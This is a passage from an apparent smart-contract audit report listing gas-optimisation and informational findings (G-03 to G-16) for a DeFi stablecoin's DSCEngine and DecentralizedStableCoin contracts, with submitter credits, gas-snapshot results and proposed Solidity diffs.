	+ int256 price = priceFeed.staleCheckLatestRoundData();
    // ($10e18 * 1e18) / ($2000e8 * 1e10)
    return (usdAmountInWei * PRECISION) / (uint256(price) * ADDITIONAL_FEED_PRECISION);
}
```
## <a id='G-03'></a>G-03. Use constants instead of `type(uint256).max`

_Submitted by [SBSecurity](/team/clkuz8xt7001vl608nphmevro), [SAQ](/profile/clkftc56x0006le08usdp7epo). Selected submission by: [SBSecurity](/team/clkuz8xt7001vl608nphmevro)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L329

## Summary
At the places where `type(uint256).max` is used it can be replaced with constant variable with the same value as this from the expression, it will save gas because constant variables are stored in the contract byte code.

Each of the recommendations below saves 24 gas (Tested in remix)

## Instances

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L329

## Tools Used
Manual

## Recommendations
```solidity
uint private constant MAX_UINT256_NUMBER = 115792089237316195423570985008687907853269984665640564039457584007913129639935;
uint private constant MAX_UINT256_HEX = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
uint private constant MAX_UINT256_EXPONENTIATION = 2**256 - 1;
```
## <a id='G-04'></a>G-04. Double checks

_Submitted by [BAHOZ](/profile/clk80h9bl000ml6087ltct76r), [Polaristow](/profile/clk40hl6t000wmb08y3268i63), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [Cosine](/profile/clkc7trh30004l208e0okerdn), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [BenRai](/profile/clkksmnp8000sla08ob285wxl), [Stoicov](/profile/clk43h7he008ymb08nk4eu446), [devival](/profile/clk87smah000kl708ybyqinyl), [lwltea](/profile/clk7224p9000ujt08g853wh48), [warRoom](/team/clkuq3mcw0001ju08fzp9y8bi), [0xsandy](/profile/clk43kus5009imb0830ko7dxy), [pontifex](/profile/clk3xo3e0000omm08i6ehw2ae). Selected submission by: [pontifex](/profile/clk3xo3e0000omm08i6ehw2ae)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L51

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L58

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L61

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L48

There are four checks in `DecentralizedStableCoin` contract which already exists in another parts of the project.
These two checks are already in the inherited `ERC20Burnable` contract:
```solidity
51:        if (balance < _amount) {

58:        if (_to == address(0)) {
```
These two checks are already in the `moreThanZero` modifier of the `DSCEngine` contract:
```solidity
48:        if (_amount <= 0) {

61:        if (_amount <= 0) {
```

## <a id='G-05'></a>G-05. `DSCEngine` should deploy its own `DecentralizedStableCoin`

_Submitted by [warRoom](/team/clkuq3mcw0001ju08fzp9y8bi), [0xDanielH](/profile/clkkityt00000mj08mr89rdav), [cuthalion0x](/profile/clk43656v008cmb081faosv4x). Selected submission by: [cuthalion0x](/profile/clk43656v008cmb081faosv4x)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L122

## Summary
`DSCEngine` should deploy its own `DecentralizedStableCoin` instead of accepting an address upon construction.

## Vulnerability Details
There is a perfect 1:1 correspondence between `DSCEngine` and `DecentralizedStableCoin`:
- `DSCEngine` tracks a single, immutable `i_dsc` address.
- `DecentralizedStableCoin` has a single `owner` with the power to `mint()` and `burn()` tokens.

Therefore, it is needless to deploy the `DecentralizedStableCoin` prior to deployment of a `DSCEngine` and only serves to add extra steps to the process, including migration of the `owner`.

## Impact
Unnecessary gas/deployment UX burden.

## Tools Used
Manual review.

## Recommendations
Consider changing the `DSCEngine` constructor like this:

```diff
-         i_dsc = DecentralizedStableCoin(dscAddress);
+         i_dsc = new DecentralizedStableCoin();
```
## <a id='G-06'></a>G-06. `burn()` and `staleCheckLatestRoundData()` and `getTimeout()` can be `external`

_Submitted by [RoboCrypter](/profile/clk68iifx000gl6080mjee9yv), [nisedo](/profile/clk3saar60000l608gsamuvnw), [ZanyBonzy](/profile/clk9uu45r0000js08lnm9zbez), [TeamFliBit](/team/clki07mfj0001la08ctbacja0). Selected submission by: [nisedo](/profile/clk3saar60000l608gsamuvnw)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L46

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L21-L25

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/libraries/OracleLib.sol#L35-L38

## Summary
`burn()` can be `external` to save gas.

## Vulnerability Details
`burn()` in `DecentralizedStableCoin.sol` and `staleCheckLatestRoundData()` and `getTimeout()` in `OracleLib.sol` aren't called inside the contract and thus can be set to `external`.


## Impact
Useless gas consumption.

## Tools Used
Manual review

## Recommendations
Set the functions to `external` to save gas.
## <a id='G-07'></a>G-07. Replace OZ's library with Solmate to save gas

_Submitted by [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DecentralizedStableCoin.sol#L26-L27

## Summary
Solmate's ERC20 and Ownable implementations are more optimized than OZ's version. In order to save gas is recommended to switch such implementations from OZ to Solmate in `DecentralizedStableCoin.sol`

## Impact
testRevertsIfMintFails() (gas: -60 (-0.003%)) 
testRevertsIfTransferFromFails() (gas: -60 (-0.003%)) 
testHealthFactorCanGoBelowOne() (gas: -19 (-0.007%)) 
testRevertsWithUnapprovedCollateral() (gas: -60 (-0.008%)) 
testProperlyReportsHealthFactor() (gas: -19 (-0.009%)) 
testRevertsIfRedeemAmountIsZero() (gas: -19 (-0.009%)) 
testCanDepositCollateralWithoutMinting() (gas: -17 (-0.019%)) 
testCanMintDsc() (gas: -40 (-0.020%)) 
testCanMintWithDepositedCollateral() (gas: -40 (-0.020%)) 
testRevertsIfTokenLengthDoesntMatchPriceFeeds() (gas: -54 (-0.030%)) 
testRevertsIfBurnAmountIsZero() (gas: -79 (-0.039%)) 
testRevertsIfMintAmountIsZero() (gas: -79 (-0.039%)) 
testCantLiquidateGoodHealthFactor() (gas: -144 (-0.041%)) 
testCantBurnMoreThanYouHave() (gas: -32 (-0.053%)) 
testMustBurnMoreThanZero() (gas: -32 (-0.053%)) 
testCantMintToZeroAddress() (gas: -7 (-0.056%)) 
testMustMintMoreThanZero() (gas: -7 (-0.058%)) 
testRevertsIfCollateralZero() (gas: -60 (-0.138%)) 
testRevertsIfMintedDscBreaksHealthFactor() (gas: -490 (-0.295%)) 
testRevertsIfMintAmountBreaksHealthFactor() (gas: -496 (-0.298%)) 
testUserStillHasSomeEthAfterLiquidation() (gas: -1821 (-0.365%)) 
testLiquidationPayoutIsCorrect() (gas: -1821 (-0.376%)) 
testLiquidatorTakesOnUsersDebt() (gas: -1821 (-0.377%)) 
testUserHasNoMoreDebt() (gas: -1821 (-0.377%)) 
testCanRedeemDepositedCollateral() (gas: -1823 (-0.724%)) 
testMustRedeemMoreThanZero() (gas: -1806 (-0.762%)) 
testCanBurnDsc() (gas: -1823 (-0.768%)) 
Overall gas change: -14550 (-0.096%)

## Tools Used
Manual Review

## Recommendations
Switch `ERC20Burnable.sol` to `ERC20` from `solmate`.
Switch `Ownable.sol` to `Owned.sol` from `solmate`
## <a id='G-08'></a>G-08. Use `==` instead for `<=` for `uints` when comparing for `zero` values

_Submitted by [BAHOZ](/profile/clk80h9bl000ml6087ltct76r), [shivam21](/profile/clk9rwymp0000l909djti6444), [ShayanShamsi](/profile/clk3tu0io001sl5080roowxvc), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [nisedo](/profile/clk3saar60000l608gsamuvnw), [n4thedev](/profile/clk43uhn0000ame08u4hn3w1i), [n1punp](/profile/clk6bmca40000mu080urrlhqi), [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79), [Cosine](/profile/clkc7trh30004l208e0okerdn), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [jigster](/profile/clkm34tw50014k008y4a8op2f), [0x0115](/profile/clk4scd7q0000l208rpyf7gvh), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Bauchibred](/profile/clk9ibj6p0002mh08c603lr2j), [devival](/profile/clk87smah000kl708ybyqinyl), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [karanctf](/profile/clk85gz2g0006mw087jgqqicj), [seraviz](/profile/clkctjlzr000al908xkmooh9q), [nervouspika](/profile/clk8s260t000el108iz3yrkhy), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n), [0xScourgedev](/profile/clkj0r4v30000l5085winknb6). Selected submission by: [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L48

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DecentralizedStableCoin.sol#L61

## Summary
Using `== 0` is cheaper than `<= 0` for uints <br>
There are `2` instances of this issue:

```solidity
File: src/DecentralizedStableCoin.sol

48:  if (_amount <= 0) {

61:  if (_amount <= 0) {
```
## <a id='G-09'></a>G-09. # `_burnDsc` function on `DSCEngine` can be simplified

_Submitted by [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L274-L279

## Summary

`_burnDsc` function on `DSCEngine` can be simplified to avoid extra calls.

## Vulnerability Details

Instead of doing a `transfer` and a `burn`, you can just use `burnFrom`.



## Impact

Gas impact **Overall gas change: -336291 (-2.229%)**

```
testRevertsIfTokenLengthDoesntMatchPriceFeeds() (gas: -40 (-0.022%)) 
testRevertsIfMintFails() (gas: -36694 (-1.805%)) 
testRevertsIfTransferFromFails() (gas: -36694 (-1.876%)) 
testRevertsIfTransferFails() (gas: -36694 (-1.901%)) 
testMustImproveHealthFactorOnLiquidation() (gas: -81010 (-3.427%)) 
testUserStillHasSomeEthAfterLiquidation() (gas: -20737 (-4.160%)) 
testLiquidationPayoutIsCorrect() (gas: -20737 (-4.281%)) 
testLiquidatorTakesOnUsersDebt() (gas: -20737 (-4.289%)) 
testUserHasNoMoreDebt() (gas: -20737 (-4.290%)) 
testCanRedeemDepositedCollateral() (gas: -20737 (-8.240%)) 
testCanBurnDsc() (gas: -20737 (-8.739%)) 
testMustRedeemMoreThanZero() (gas: -20737 (-8.751%)) 
Overall gas change: -336291 (-2.229%)
```

## Tools Used

Manual revision

## Recommendations

```diff
diff --git a/src/DSCEngine.sol b/src/DSCEngine.sol
index a7a6639..1906a92 100644
--- a/src/DSCEngine.sol
+++ b/src/DSCEngine.sol
@@ -271,12 +271,7 @@ contract DSCEngine is ReentrancyGuard {
      */
     function _burnDsc(uint256 amountDscToBurn, address onBehalfOf, address dscFrom) private {
         s_DSCMinted[onBehalfOf] -= amountDscToBurn;
-        bool success = i_dsc.transferFrom(dscFrom, address(this), amountDscToBurn);
-        // This conditional is hypothtically unreachable
-        if (!success) {
-            revert DSCEngine__TransferFailed();
-        }
-        i_dsc.burn(amountDscToBurn);
+        i_dsc.burnFrom(dscFrom, amountDscToBurn);
     }
 
     function _redeemCollateral(address from, address to, address tokenCollateralAddress, uint256 amountCollateral)
```
## <a id='G-10'></a>G-10. `Ownable` and `ERC20Burneable` implementations arent necessary in `DecentralizedStableCoin`

_Submitted by [LaScaloneta](/team/clkgxjy6h0025lc080s97ux79)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DecentralizedStableCoin.sol#L39

## Summary

An optimization issue has been identified in the `DecentralizedStableCoin` smart contract. It involves replacing the OpenZeppelin's `Ownable` contract with a simple `owner` state variable and removing `ERC20Burnable`. This will improve gas efficiency and simplify the contract.

## Vulnerability Details

While this is not a security vulnerability per se, the current implementation is inefficient and could be improved. 

1. The contract uses the `Ownable` contract from OpenZeppelin. The `Ownable` contract is designed to provide a general ownership solution, which can be overkill in many situations. In this case, the `DecentralizedStableCoin` is always owned by `DSCEngine`, so a simpler ownership pattern can be used.

2. The `DecentralizedStableCoin` contract extends `ERC20Burnable`, which provides an additional `burnFrom` method that allows third parties to burn tokens from a user's account (provided they have an allowance). This functionality is not required in the current context.

## Impact

This proposed optimization would result in a gas reduction of approximately 0.264%. While this might seem insignificant, it's important to note that in high-volume systems, this could translate to substantial savings. 

Moreover, simplifying the contract also makes it easier to understand and maintain, reducing the risk of bugs and vulnerabilities.

**Benchmark results**
```
testUserStillHasSomeEthAfterLiquidation() (gas: -1992 (-0.400%)) 
testLiquidationPayoutIsCorrect() (gas: -1992 (-0.411%)) 
testLiquidatorTakesOnUsersDebt() (gas: -1992 (-0.412%)) 
testUserHasNoMoreDebt() (gas: -1992 (-0.412%)) 
testCantLiquidateGoodHealthFactor() (gas: -2204 (-0.622%)) 
testHealthFactorCanGoBelowOne() (gas: -2102 (-0.725%)) 
testCanRedeemDepositedCollateral() (gas: -1893 (-0.752%)) 
testCanBurnDsc() (gas: -1893 (-0.798%)) 
testMustRedeemMoreThanZero() (gas: -1911 (-0.806%)) 
testProperlyReportsHealthFactor() (gas: -2102 (-1.000%)) 
testCanMintDsc() (gas: -2080 (-1.018%)) 
testCanMintWithDepositedCollateral() (gas: -2080 (-1.024%)) 
testRevertsIfRedeemAmountIsZero() (gas: -2102 (-1.044%)) 
testRevertsIfBurnAmountIsZero() (gas: -2102 (-1.045%)) 
testRevertsIfMintAmountIsZero() (gas: -2102 (-1.045%)) 
testCantBurnMoreThanYouHave() (gas: -2420 (-4.034%)) 
testMustBurnMoreThanZero() (gas: -2420 (-4.035%)) 
testCantMintToZeroAddress() (gas: -2230 (-17.922%)) 
testMustMintMoreThanZero() (gas: -2230 (-18.488%)) 
Overall gas change: -39821 (-0.264%)
```

## Tools Used

`forge snapshot --diff`

## Recommendations

It's recommended to replace the `Ownable` contract with a simple `owner` state variable. This will allow to remove the `ERC20Burnable` and simplifying the burn method.

```diff
diff --git a/src/DecentralizedStableCoin.sol b/src/DecentralizedStableCoin.sol
index d3652a5..58cd9b7 100644
--- a/src/DecentralizedStableCoin.sol
+++ b/src/DecentralizedStableCoin.sol
@@ -36,14 +36,19 @@ import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
  * This is the contract meant to be governed by DSCEngine. This contract is just the ERC20 implementation of our stablecoin system.
  *
  */
-contract DecentralizedStableCoin is ERC20Burnable, Ownable {
+contract DecentralizedStableCoin is ERC20 {
+    address private immutable i_owner;
+
     error DecentralizedStableCoin__MustBeMoreThanZero();
     error DecentralizedStableCoin__BurnAmountExceedsBalance();
     error DecentralizedStableCoin__NotZeroAddress();
 
-    constructor() ERC20("DecentralizedStableCoin", "DSC") {}
+    constructor(address _owner) ERC20("DecentralizedStableCoin", "DSC") {
+        i_owner = _owner;
+    }
 
-    function burn(uint256 _amount) public override onlyOwner {
+    function burn(uint256 _amount) external  {
+        require(i_owner == msg.sender, "Only owner can burn");
         uint256 balance = balanceOf(msg.sender);
         if (_amount <= 0) {
             revert DecentralizedStableCoin__MustBeMoreThanZero();
@@ -51,10 +56,11 @@ contract DecentralizedStableCoin is ERC20Burnable, Ownable {
         if (balance < _amount) {
             revert DecentralizedStableCoin__BurnAmountExceedsBalance();
         }
-        super.burn(_amount);
+        _burn(msg.sender, _amount);
     }
 
-    function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
+    function mint(address _to, uint256 _amount) external returns (bool) {
+        require(i_owner == msg.sender, "Only owner can mint");
         if (_to == address(0)) {
             revert DecentralizedStableCoin__NotZeroAddress();
         }
@@ -64,4 +70,8 @@ contract DecentralizedStableCoin is ERC20Burnable, Ownable {
         _mint(_to, _amount);
         return true;
     }
+
+    function owner() external view returns (address) {
+        return i_owner;
+    }
 }

diff --git a/test/unit/DecentralizedStablecoinTest.t.sol b/test/unit/DecentralizedStablecoinTest.t.sol
index e745c53..94c8844 100644
--- a/test/unit/DecentralizedStablecoinTest.t.sol
+++ b/test/unit/DecentralizedStablecoinTest.t.sol
@@ -10,7 +10,7 @@ contract DecentralizedStablecoinTest is StdCheats, Test {
     DecentralizedStableCoin dsc;
 
     function setUp() public {
-        dsc = new DecentralizedStableCoin();
+        dsc = new DecentralizedStableCoin(address(this));
     }
 
     function testMustMintMoreThanZero() public {

diff --git a/script/DeployDSC.s.sol b/script/DeployDSC.s.sol
index 24192fb..a1b0aba 100644
--- a/script/DeployDSC.s.sol
+++ b/script/DeployDSC.s.sol
@@ -21,10 +21,14 @@ contract DeployDSC is Script {
         priceFeedAddresses = [wethUsdPriceFeed, wbtcUsdPriceFeed];
 
         vm.startBroadcast(deployerKey);
-        DecentralizedStableCoin dsc = new DecentralizedStableCoin();
-        DSCEngine engine = new DSCEngine(tokenAddresses, priceFeedAddresses, address(dsc));
 
-        dsc.transferOwnership(address(engine));
+        address predictedEngine = 0xdBc6bEB03Bd0829E8f48A86D121d448c364D3983;
+
+        DecentralizedStableCoin dsc = new DecentralizedStableCoin(predictedEngine);
+        
+        DSCEngine engine = new DSCEngine{salt: keccak256("predictEngine")}(tokenAddresses, priceFeedAddresses, address(dsc));
+
+        //dsc.transferOwnership(address(engine));
         vm.stopBroadcast();
         return (dsc, engine, config);
     }
```

Moreover, corresponding changes should be made in the tests and deployment script. Note that in the new constructor, the owner's address needs to be provided.

This proposed changes improve the contract's efficiency, clarity and maintainability, and reduces the risk of potential issues or vulnerabilities.

## <a id='G-11'></a>G-11. `++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops

_Submitted by [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [jnrlouis](/profile/clk4myztd0000l408kiebyflx), [0xNiloy](/profile/clk43a7ek000ojq085f8vxr9v), [0xSafeGuard](/team/clkhmrygo0001l508vlnyl978), [ptsanev](/profile/clk41ds6d0056la0868j7rf0l), [Mlome](/profile/clk9sw5fd0000l3086c2qf6ji), [discardedaccount](/profile/clk5fs7ta000gjx08nq7gkeej), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [0xyPhilic](/profile/clk3wry0p0008mf08lbxjpcks), [Rotcivegaf](/profile/clk3ziayk002ojq08apo5ojrt), [ch0bu](/profile/clk3xuwvc0030l80876l7savt), [xAlismx](/profile/clkbcjoju0000mu08bflruz0u), [souilos](/profile/clkm7ipa90014l608xim10mt3), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [TheSchnilch](/profile/clk89mhkb0002mk080c64z7b8), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [castleChain](/profile/clk48to2u004wla08041jl9ld), [97Sabit](/profile/clk42eeq0007mla08lc11yszp), [MaanVader](/profile/clk8lcnn40012mq08dtb5fzfg), [phoeniV110](/profile/clk687ykf0000l608ovci3h3y), [InAllHonesty](/profile/clkgm90b9000gms085g528phk), [tsvetanovv](/profile/clk3x0ilz001ol808l9uu6vpj), [asuiTouthang](/profile/clk9bd0tr0000mi084i1py0rx), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [TorpedopistolIxc41](/profile/clk5ki3ah0000jq08yaeho8g7), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [chaos304](/profile/clk8r1vgy0000l508gcw3pfvk), [0xackermann](/profile/clkf2nid00000ld080whp7buk), [mgf15](/profile/clk993ol40000mr08qghps3lm), [SMA4](/profile/clkja41s4000ok008bpul7m18), [Qiezie](/profile/clk3vxv520010kx08lj3sw4ok), [Dharma](/profile/clk7w56z0000gl708u76d61ke), [pks27](/profile/clkc1tqhb0000jt08tz2r0wmq), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [TheSavageTeddy](/profile/clk9nkvfc0000m9080ev2utin), [PratRed](/profile/clkkqoyem0008jw08qno0zb4f), [emrekocak](/profile/clk45l0yn0040mg08wwew3jn1), [SAQ](/profile/clkftc56x0006le08usdp7epo), [MrLegend](/profile/clkfykolv0000me08b9o0ralx), [0xadarsh](/profile/clkvfe7q8000wl408zqbmb7do), [xfu](/profile/clke2oift0000l508j03apihy), [owade](/profile/clk9j4mf20002mi08k4758eni), [ni8mare](/profile/clk3xgimw001mmf08gkbh3jbm), [0xScourgedev](/profile/clkj0r4v30000l5085winknb6), [JPCourses](/profile/clk41wibj006sla08llbkfxxu), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n). Selected submission by: [SolSaver](/profile/clkwer9fs001kjy0849j3go9n)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol

## Summary
`++i`/`i++` should be `unchecked{++i}`/`unchecked{i++}` when it is not possible for them to overflow, as is the case when used in `for`- and `while`-loops

## Vulnerability Details

The `unchecked` keyword is new in solidity version 0.8.0, so this only applies to that version or higher, which these instances are.
This saves **30-40 gas [per loop](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#the-increment-in-for-loop-post-condition-can-be-made-unchecked)**


*Instances (2)*:
```solidity
File: src/DSCEngine.sol

119:         for (uint256 i = 0; i < tokenAddresses.length; i++) {

355:         for (uint256 i = 0; i < s_collateralTokens.length; i++) {


```
Link to code - https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/tree/main/src/DSCEngine.sol

## Tools Used
Code Review using VSCode

## Recommendations

Use `unchecked{++i}`/`unchecked{i++}` in loops
## <a id='G-12'></a>G-12. No amountCollateral > balance check

_Submitted by [nmirchev8](/profile/clkao1p090000ld08dv6v2xus), [nisedo](/profile/clk3saar60000l608gsamuvnw), [33audits](/profile/clkh3zf810018mi08yjzuvbu1), [0xPublicGoods](/profile/clk56xif80002l208nv5vsvln), [iroh](/profile/clk8luozk001omg081ih518e3). Selected submission by: [nisedo](/profile/clk3saar60000l608gsamuvnw)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L135

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L149

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L169

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L183

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/d1c5501aa79320ca0aeaa73f47f0dbc88c7b77e2/src/DSCEngine.sol#L282

## Summary
No `amountCollateral` > balance check

## Vulnerability Details
There is a `moreThanZero` modifier to unsure that the user won't input 0 as `amountCollateral` but there isn't any check to ensure that the user is inputting an `amountCollateral` <= to his balance.

## Impact
The transaction will fail is the user inputs an `amountCollateral` > to his balance.

## Tools Used
Manual review

## Recommendations
Add a `if` or `require` check to unsure user is inputting `amountCollateral` <= to his balance.
## <a id='G-13'></a>G-13. Constants should be used for hardcoded values

_Submitted by [akhilmanga](/profile/clk48iw7c0056l508gqk81x6a), [sobieski](/profile/clk7551e0001ol408rl4fyi5s), [0xbug](/profile/clkch5i9j0008jz088olf29x1), [castleChain](/profile/clk48to2u004wla08041jl9ld), [ABA](/profile/clk43rqfo0008mg084q0ema3g), [charlesCheerful](/profile/clk3wmzul0008l808andx29ul), [Bbash](/profile/clkcphh780004mp083mgcgae1), [neocrao](/profile/clkq5kij0000amc083lbapqf7), [Ericselvig](/profile/clk3tbdri000qib08vc8d5xn2), [SolSaver](/profile/clkwer9fs001kjy0849j3go9n). Selected submission by: [ABA](/profile/clk43rqfo0008mg084q0ema3g)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L331

## Description

Constants should be used for hardcoded values, especially if the [constants already exist](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L71), as it is in this case in `DSCEngine`.

```Solidity
    uint256 private constant PRECISION = 1e18;
```

In [DSCEngine::_calculateHealthFactor](https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L331) the `1e18` can be safely (and contextually) replaced with the already declared `PRECISION` constant.

```Solidity
        return (collateralAdjustedForThreshold * 1e18) / totalDscMinted;
```

## Recommend Mitigation

Use the `PRECISION` constant instead of `1e18`.
## <a id='G-14'></a>G-14. [L-02] It is not specified which token is not allowed 

_Submitted by [akhilmanga](/profile/clk48iw7c0056l508gqk81x6a), [kz0213871](/profile/clk9oqssu0008me08w56bq8n4). Selected submission by: [kz0213871](/profile/clk9oqssu0008me08w56bq8n4)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L55

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L104

## Summary
The `error DSCEngine__NotAllowedToken()` should include the address of the disallowed token, to make it easier for the user or dev to see what token is throwing the error.

## Vulnerability Details
The use of errors should describe the situation that presents the error, in this case the `error DSCEngine__NotAllowedToken()` error does not include the address of the token that is not allowed, even when the modifier that uses it is passed this address by parameter.

## Impact
Low

## Tools Used
Manual code review 

## Recommendations
Change for :
```diff
- `error DSCEngine__NotAllowedToken()`
+ `error DSCEngine__NotAllowedToken(address token)`
```
and 
```diff
   modifier isAllowedToken(address token) {
        if (s_priceFeeds[token] == address(0)) {
-            revert DSCEngine__NotAllowedToken();
+            revert DSCEngine__NotAllowedToken(token);
        }
        _;
    }


```
## <a id='G-15'></a>G-15. DSC Mint will either return true or revert, thus checking `minted` status in `mintDcs` is unnecessary

_Submitted by [akhilmanga](/profile/clk48iw7c0056l508gqk81x6a), [JohnnyTime](/profile/clk6vuje90014mm0800cqeo8w), [chainNue](/profile/clkceb0jn000ol8082eekhkg8), [Aamir](/profile/clkcp1q210006k108kwj8txqv). Selected submission by: [chainNue](/profile/clkceb0jn000ol8082eekhkg8)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L202-L204

## Summary

DSC Mint will either return true or revert, thus checking `minted` status in `mintDcs` is unnecessary

## Vulnerability Details

Whe minting DSC via DSCEngine, there is a check status if it's `minted` or not. If it's return false, then it will revert with `DSCEngine__MintFailed`.

But if we check on `DecentralizedStableCoin` contract, the `mint` function will either return true or revert. So the previous check on `mintDsc` is useless.

```solidity
File: DSCEngine.sol
197:     function mintDsc(uint256 amountDscToMint) public moreThanZero(amountDscToMint) nonReentrant {
198:         s_DSCMinted[msg.sender] += amountDscToMint;
199:         // if they minted too much ($150 DSC, $100 ETH)
200:         _revertIfHealthFactorIsBroken(msg.sender);
201:         bool minted = i_dsc.mint(msg.sender, amountDscToMint);
202:         if (!minted) {
203:             revert DSCEngine__MintFailed();
204:         }
205:     }

File: DecentralizedStableCoin.sol
57:     function mint(address _to, uint256 _amount) external onlyOwner returns (bool) {
58:         if (_to == address(0)) {
59:             revert DecentralizedStableCoin__NotZeroAddress();
60:         }
61:         if (_amount <= 0) {
62:             revert DecentralizedStableCoin__MustBeMoreThanZero();
63:         }
64:         _mint(_to, _amount);
65:         return true;
66:     }
```

## Impact

Will save a bit of deployment gas, and cleanup unreachable code

## Tools Used

Manual analysis

## Recommendations

Remove the `minted` check, to revert when mint failed

## <a id='G-16'></a>G-16. Spelling errors

_Submitted by [JohnLaw](/profile/clk4b3vtt001ald08ew8go29n), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l), [TheSchnilch](/profile/clk89mhkb0002mk080c64z7b8), [Bbash](/profile/clkcphh780004mp083mgcgae1), [0xPublicGoods](/profile/clk56xif80002l208nv5vsvln), [pontifex](/profile/clk3xo3e0000omm08i6ehw2ae). Selected submission by: [Bbash](/profile/clkcphh780004mp083mgcgae1)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L40

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L210

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L220

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L224

https://github.com/Cyfrin/2023-07-foundry-defi-stablecoin/blob/main/src/DSCEngine.sol#L365

## Summary
